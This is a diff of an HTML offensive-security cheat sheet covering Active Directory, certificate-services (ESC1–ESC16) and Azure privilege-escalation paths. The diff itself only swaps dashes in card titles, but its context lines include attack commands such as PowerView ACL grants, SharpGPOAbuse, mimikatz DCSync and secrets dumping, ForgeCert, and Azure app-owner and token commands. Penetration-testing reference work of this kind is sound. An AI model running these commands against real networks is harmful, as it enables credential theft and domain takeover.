 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">PowerView — Grant GenericAll</span><span class="tool-version">PowerSploit</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">PowerView - Grant GenericAll</span><span class="tool-version">PowerSploit</span></div>
   <div class="code-block"><pre>Add-DomainObjectAcl -TargetIdentity '<span class="var" data-var="OU_DN">{OU_DN}</span>' -PrincipalIdentity <span class="var" data-var="USERNAME">{USERNAME}</span> -Rights GenericAll -Credential $cred</pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
@@ -5324,7 +5324,7 @@ SharpGPOAbuse.exe --AddComputerTask --GPOID '<span class="var" data-var="GPO_GUI
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">GenericWrite on DOMAIN — GP-Link, Description</h3>
+    <h3 class="card-title">GenericWrite on DOMAIN - GP-Link, Description</h3>
     <p class="card-desc">Write the GP-Link attribute to link a malicious GPO, or write description for social engineering. Cannot modify most security attributes without GenericAll.</p>
   </div>
 <div class="platform-tabs">
@@ -5395,7 +5395,7 @@ SharpGPOAbuse.exe --AddComputerTask --GPOID '<span class="var" data-var="GPO_GUI
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">WriteGPLink — GPO Link Manipulation</h3>
+    <h3 class="card-title">WriteGPLink - GPO Link Manipulation</h3>
     <p class="card-desc">Write the gPLink attribute on a domain or OU to link a malicious GPO.</p>
   </div>
 <div class="platform-tabs">
@@ -5472,7 +5472,7 @@ SharpGPOAbuse.exe --AddComputerTask --GPOID '<span class="var" data-var="GPO_GUI
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">GenericWrite on GPO — GPT Modification</h3>
+    <h3 class="card-title">GenericWrite on GPO - GPT Modification</h3>
     <p class="card-desc">Write to gPCFileSysPath or modify GPT permissions. Can redirect GPO to attacker-controlled SYSVOL path.</p>
   </div>
 <div class="platform-tabs">
@@ -5549,7 +5549,7 @@ SharpGPOAbuse.exe --AddComputerTask --GPOID '<span class="var" data-var="GPO_GUI
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">ADCSESC1 — Client Supply Subject + Auth EKU</h3>
+    <h3 class="card-title">ADCSESC1 - Client Supply Subject + Auth EKU</h3>
     <p class="card-desc">Enroll rights + client supplies subject + authentication EKU + no manager approval + published to trusted CA.</p>
   </div>
 <div class="platform-tabs">
@@ -5631,7 +5631,7 @@ SharpGPOAbuse.exe --AddComputerTask --GPOID '<span class="var" data-var="GPO_GUI
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">ADCSESC3 — Enrollment Agent</h3>
+    <h3 class="card-title">ADCSESC3 - Enrollment Agent</h3>
     <p class="card-desc">Request enrollment agent certificate, then request certificate on behalf of another user.</p>
   </div>
 <div class="platform-tabs">
@@ -5694,7 +5694,7 @@ SharpGPOAbuse.exe --AddComputerTask --GPOID '<span class="var" data-var="GPO_GUI
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">ADCSESC4 — Template Control</h3>
+    <h3 class="card-title">ADCSESC4 - Template Control</h3>
     <p class="card-desc">Modify existing certificate template to enable ESC1 conditions. Already covered in GenericAll on CertTemplate.</p>
   </div>
 <div class="platform-tabs">
@@ -5764,7 +5764,7 @@ SharpGPOAbuse.exe --AddComputerTask --GPOID '<span class="var" data-var="GPO_GUI
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">ADCSESC5 — PKI Object ACLs</h3>
+    <h3 class="card-title">ADCSESC5 - PKI Object ACLs</h3>
     <p class="card-desc">Abuse ACLs on PKI objects: CA, cert template, enrollment services, etc.</p>
   </div>
 <div class="platform-tabs">
@@ -5833,7 +5833,7 @@ Certify.exe find /vulnerable</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">ADCSESC6a — EDITF_ATTRIBUTESUBJECTALTNAME2</h3>
+    <h3 class="card-title">ADCSESC6a - EDITF_ATTRIBUTESUBJECTALTNAME2</h3>
     <p class="card-desc">CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set. Allows client to specify SAN in ANY template request.</p>
   </div>
 <div class="platform-tabs">
@@ -5902,7 +5902,7 @@ Certify.exe find /vulnerable</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">ADCSESC7 — Certificate Manager</h3>
+    <h3 class="card-title">ADCSESC7 - Certificate Manager</h3>
     <p class="card-desc">Certificate Manager can issue/retrieve pending certificate requests. Approve malicious requests.</p>
   </div>
 <div class="platform-tabs">
@@ -5980,7 +5980,7 @@ Certify.exe find /vulnerable</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">ADCSESC9 — Weak Kerberos Mapping (UPN/DNS)</h3>
+    <h3 class="card-title">ADCSESC9 - Weak Kerberos Mapping (UPN/DNS)</h3>
     <p class="card-desc">NO_SECURITY_EXTENSION flag + weak mapping DC + UPN/DNS in SAN. Authenticate as arbitrary user.</p>
   </div>
 <div class="platform-tabs">
@@ -6043,7 +6043,7 @@ Certify.exe find /vulnerable</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">ADCSESC11 — Unencrypted RPC Enrollment</h3>
+    <h3 class="card-title">ADCSESC11 - Unencrypted RPC Enrollment</h3>
     <p class="card-desc">CA has IF_ENFORCEENCRYPTICERTREQUEST NOT set. RPC channel to CA is unencrypted. Can downgrade or MITM certificate requests.</p>
   </div>
 <div class="platform-tabs">
@@ -6109,7 +6109,7 @@ Certify.exe find /vulnerable</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">ADCSESC12 — CA Private Key Extraction</h3>
+    <h3 class="card-title">ADCSESC12 - CA Private Key Extraction</h3>
     <p class="card-desc">CA private key stored on vulnerable HSM or with extractable credentials. Requires prior CA server compromise.</p>
   </div>
 <div class="platform-tabs">
@@ -6189,7 +6189,7 @@ lsadump::secrets /patch</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">ADCSESC13 — OID Group Link</h3>
+    <h3 class="card-title">ADCSESC13 - OID Group Link</h3>
     <p class="card-desc">msDS-OIDToGroupLink links issuance policy OID to privileged universal group. Enroll with policy → group membership.</p>
   </div>
 <div class="platform-tabs">
@@ -6273,7 +6273,7 @@ lsadump::secrets /patch</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">ADCSESC14 — Weak Certificate Mappings</h3>
+    <h3 class="card-title">ADCSESC14 - Weak Certificate Mappings</h3>
     <p class="card-desc">Weak mappings in altSecurityIdentities: X509RFC822, X509IssuerSubject, X509SubjectOnly. Exploitable after KB5014754 if strong mapping fallback.</p>
   </div>
 <div class="platform-tabs">
@@ -6353,7 +6353,7 @@ lsadump::secrets /patch</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">ADCSESC15 — Schema V1 Application Policies Abuse</h3>
+    <h3 class="card-title">ADCSESC15 - Schema V1 Application Policies Abuse</h3>
     <p class="card-desc">Schema V1 templates allow Application Policies in offline request to override EKU. Create CSR with any Application Policies OID.</p>
   </div>
 <div class="platform-tabs">
@@ -6443,7 +6443,7 @@ lsadump::secrets /patch</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">ADCSESC16 — SID Extension Disabled</h3>
+    <h3 class="card-title">ADCSESC16 - SID Extension Disabled</h3>
     <p class="card-desc">CA has DisableExtensionList containing SID extension OID. Without SID extension, strong certificate mapping fails → weak mapping fallback.</p>
   </div>
 <div class="platform-tabs">
@@ -6521,7 +6521,7 @@ lsadump::secrets /patch</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">GoldenCert — Forge Certificates with CA Key</h3>
+    <h3 class="card-title">GoldenCert - Forge Certificates with CA Key</h3>
     <p class="card-desc">Compromise CA private key → forge certificates for any user indefinitely.</p>
   </div>
 <div class="platform-tabs">
@@ -6601,7 +6601,7 @@ ForgeCert.exe --CaCertPath extracted.pfx ...</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">ManageCA — CA Management</h3>
+    <h3 class="card-title">ManageCA - CA Management</h3>
     <p class="card-desc">Manage CA configuration, backup, and template publishing.</p>
   </div>
 <div class="platform-tabs">
@@ -6679,7 +6679,7 @@ ForgeCert.exe --CaCertPath extracted.pfx ...</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">ManageCertificates — Approve/Retrieve Certificates</h3>
+    <h3 class="card-title">ManageCertificates - Approve/Retrieve Certificates</h3>
     <p class="card-desc">Issue and retrieve pending certificate requests. Same as ESC7 in practice.</p>
   </div>
 <div class="platform-tabs">
@@ -6759,7 +6759,7 @@ ForgeCert.exe --CaCertPath extracted.pfx ...</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">AZGlobalAdmin — Full Tenant Admin</h3>
+    <h3 class="card-title">AZGlobalAdmin - Full Tenant Admin</h3>
     <p class="card-desc">Full control over Entra ID tenant. Can modify any user, app, or resource.</p>
   </div>
 <div class="platform-tabs">
@@ -6865,7 +6865,7 @@ Get-MgUser -All</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">AZPrivilegedRoleAdmin — Role Assignment</h3>
+    <h3 class="card-title">AZPrivilegedRoleAdmin - Role Assignment</h3>
     <p class="card-desc">Can assign any privileged role including Global Admin. Same tools as Global Admin.</p>
   </div>
 <div class="platform-tabs">
@@ -6943,7 +6943,7 @@ Get-MgUser -All</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">AZAppAdmin / AZCloudAppAdmin — App Secret Abuse</h3>
+    <h3 class="card-title">AZAppAdmin / AZCloudAppAdmin - App Secret Abuse</h3>
     <p class="card-desc">Admin on enterprise apps → add secret/certificate → client credentials flow → API access.</p>
   </div>
 <div class="platform-tabs">
@@ -7023,7 +7023,7 @@ az account get-access-token --resource https://graph.microsoft.com</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">AZAddOwner / AZAddMembers / AZAddSecret — App/Group Manipulation</h3>
+    <h3 class="card-title">AZAddOwner / AZAddMembers / AZAddSecret - App/Group Manipulation</h3>
     <p class="card-desc">Add self to app/group, add secret to app, or add owner to resources.</p>
   </div>
 <div class="platform-tabs">
@@ -7097,7 +7097,7 @@ az ad app owner add --id <span class="var" data-var="APP_ID">{APP_ID}</span> --o
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">AZVMAdminLogin / AZVMContributor / AZContributor — VM Compromise</h3>
+    <h3 class="card-title">AZVMAdminLogin / AZVMContributor / AZContributor - VM Compromise</h3>
     <p class="card-desc">VM admin/Contributor → run commands, reset password, or extract managed identity tokens.</p>
   </div>
 <div class="platform-tabs">
@@ -7271,7 +7271,7 @@ kubectl exec -it pod-name -- /bin/sh</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">AZKeyVault — Secrets Extraction</h3>
+    <h3 class="card-title">AZKeyVault - Secrets Extraction</h3>
     <p class="card-desc">Access Azure Key Vault secrets, keys, and certificates.</p>
   </div>
 <div class="platform-tabs">
@@ -7350,7 +7350,7 @@ kubectl exec -it pod-name -- /bin/sh</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">AZUserAccessAdministrator — RBAC Escalation</h3>
+    <h3 class="card-title">AZUserAccessAdministrator - RBAC Escalation</h3>
     <p class="card-desc">Can assign any RBAC role including Owner. Self-elevation path to full subscription control.</p>
   </div>
 <div class="platform-tabs">
@@ -7416,7 +7416,7 @@ kubectl exec -it pod-name -- /bin/sh</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">AZRunsAs — Automation Account RunAs</h3>
+    <h3 class="card-title">AZRunsAs - Automation Account RunAs</h3>
     <p class="card-desc">Automation Account RunAs = service principal with certificate. Steal for persistent cloud access.</p>
   </div>
 <div class="platform-tabs">
@@ -7495,7 +7495,7 @@ az automation account show -g <span class="var" data-var="RESOURCE_GROUP">{RESOU
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">AZMG — Microsoft Graph App Permissions</h3>
+    <h3 class="card-title">AZMG - Microsoft Graph App Permissions</h3>
     <p class="card-desc">Microsoft Graph app permissions for directory-wide modifications. Compromise app = tenant admin.</p>
   </div>
 <div class="platform-tabs">
@@ -7625,7 +7625,7 @@ az ad app permission grant --id <span class="var" data-var="APP_ID">{APP_ID}</sp
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">AbuseTGTDelegation — Cross-Forest TGT Delegation</h3>
+    <h3 class="card-title">AbuseTGTDelegation - Cross-Forest TGT Delegation</h3>
     <p class="card-desc">Cross-forest with TGT delegation enabled. Coerce TGT delegation for inter-realm access.</p>
   </div>
 <div class="platform-tabs">
@@ -7699,7 +7699,7 @@ lsadump::dcsync /domain:<span class="var" data-var="PARENT_DOMAIN">{PARENT_DOMAI
 <span class="badge badge-time">⏱️ N/A</span>
 <span class="badge badge-noise">🔊 Low</span>
     </div>
-    <h3 class="card-title">CrossForestTrust — Inter-Forest Information</h3>
+    <h3 class="card-title">CrossForestTrust - Inter-Forest Information</h3>
     <p class="card-desc">Informational edge. Abuse via AbuseTGTDelegation, SpoofSIDHistory, or CoerceToTGT.</p>
   </div>
 <div class="platform-tabs">
@@ -7752,7 +7752,7 @@ lsadump::dcsync /domain:<span class="var" data-var="PARENT_DOMAIN">{PARENT_DOMAI
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">SameForestTrust — Intra-Forest Compromise</h3>
+    <h3 class="card-title">SameForestTrust - Intra-Forest Compromise</h3>
     <p class="card-desc">Intra-forest = shared krbtgt history. Any domain = Enterprise Admin.</p>
   </div>
 <div class="platform-tabs">
@@ -7831,7 +7831,7 @@ lsadump::dcsync /domain:<span class="var" data-var="PARENT_DOMAIN">{PARENT_DOMAI
 <span class="badge badge-time">⏱️ N/A</span>
 <span class="badge badge-noise">🔊 Low</span>
     </div>
-    <h3 class="card-title">SyncedToADUser / SyncedToEntraUser — Hybrid Identity</h3>
+    <h3 class="card-title">SyncedToADUser / SyncedToEntraUser - Hybrid Identity</h3>
     <p class="card-desc">Hybrid identity sync. Compromise synced account = both on-prem and cloud access.</p>
   </div>
 <div class="platform-tabs">
@@ -7904,7 +7904,7 @@ lsadump::dcsync /domain:<span class="var" data-var="PARENT_DOMAIN">{PARENT_DOMAI
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">Owns / OwnsLimitedRights — Ownership Abuse</h3>
+    <h3 class="card-title">Owns / OwnsLimitedRights - Ownership Abuse</h3>
     <p class="card-desc">Owner can modify DACL. OwnsLimitedRights means AdminSDHolder or OWNER RIGHTS deny is present.</p>
   </div>
 <div class="platform-tabs">
@@ -7977,7 +7977,7 @@ lsadump::dcsync /domain:<span class="var" data-var="PARENT_DOMAIN">{PARENT_DOMAI
 <span class="badge badge-time">⏱️ 1 min</span>
 <span class="badge badge-noise">🔊 Low</span>
     </div>
-    <h3 class="card-title">MemberOfLocalGroup — Local Group Recon</h3>
+    <h3 class="card-title">MemberOfLocalGroup - Local Group Recon</h3>
     <p class="card-desc">User is member of a local group on target computer. Enumerate for privilege escalation paths.</p>
   </div>
 <div class="platform-tabs">
@@ -8056,7 +8056,7 @@ lsadump::dcsync /domain:<span class="var" data-var="PARENT_DOMAIN">{PARENT_DOMAI
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">LocalToComputer — Local Account Lateral Movement</h3>
+    <h3 class="card-title">LocalToComputer - Local Account Lateral Movement</h3>
     <p class="card-desc">Local account lateral movement if password is reusable across systems.</p>
   </div>
 <div class="platform-tabs">
@@ -8128,7 +8128,7 @@ lsadump::dcsync /domain:<span class="var" data-var="PARENT_DOMAIN">{PARENT_DOMAI
 <span class="badge badge-time">⏱️ N/A</span>
 <span class="badge badge-noise">🔊 Low</span>
     </div>
-    <h3 class="card-title">ExtendedByPolicy — ESC3 Composition</h3>
+    <h3 class="card-title">ExtendedByPolicy - ESC3 Composition</h3>
     <p class="card-desc">Supporting edge for ESC3 composition. Template is extended by enrollment agent policy.</p>
   </div>
 <div class="platform-tabs">
@@ -8179,7 +8179,7 @@ lsadump::dcsync /domain:<span class="var" data-var="PARENT_DOMAIN">{PARENT_DOMAI
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">HostsCAService — CA Server Target</h3>
+    <h3 class="card-title">HostsCAService - CA Server Target</h3>
     <p class="card-desc">CA server hosting. Target for GoldenCert and ESC12 exploitation.</p>
   </div>
 <div class="platform-tabs">
@@ -8286,7 +8286,7 @@ lsadump::dcsync /domain:<span class="var" data-var="PARENT_DOMAIN">{PARENT_DOMAI
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">ProtectAdminGroups — AdminSDHolder</h3>
+    <h3 class="card-title">ProtectAdminGroups - AdminSDHolder</h3>
     <p class="card-desc">SDProp reverts ACL changes every 60 min on protected groups. Persistence requires AdminSDHolder modification.</p>
   </div>
 <div class="platform-tabs">
@@ -8892,7 +8892,7 @@ applyFilters = function() {
     });
     const countEl = document.getElementById('filterCount');
     if (count === 0) {
-        countEl.innerHTML = 'Showing <strong>0</strong> cards — <span style="color:var(--text-warning)">Try "All" filters or search instead</span>';
+        countEl.innerHTML = 'Showing <strong>0</strong> cards - <span style="color:var(--text-warning)">Try "All" filters or search instead</span>';
     } else {
         countEl.textContent = 'Showing ' + count + ' cards';
     }
@@ -9285,7 +9285,7 @@ document.addEventListener('DOMContentLoaded', function() {
 </script>
 
 <footer style="text-align:center;padding:1.5rem;border-top:1px solid var(--mah-border);color:var(--mah-text-secondary);font-size:0.75rem;font-family:'JetBrains Mono',monospace;margin-top:2rem;">
-  Built with <span style="color:#f87171;">&hearts;</span> by Mahdiesta — Offensive Security Toolkit
+  Built with <span style="color:#f87171;">&hearts;</span> by Mahdiesta - Offensive Security Toolkit
 </footer>
 
 </body>
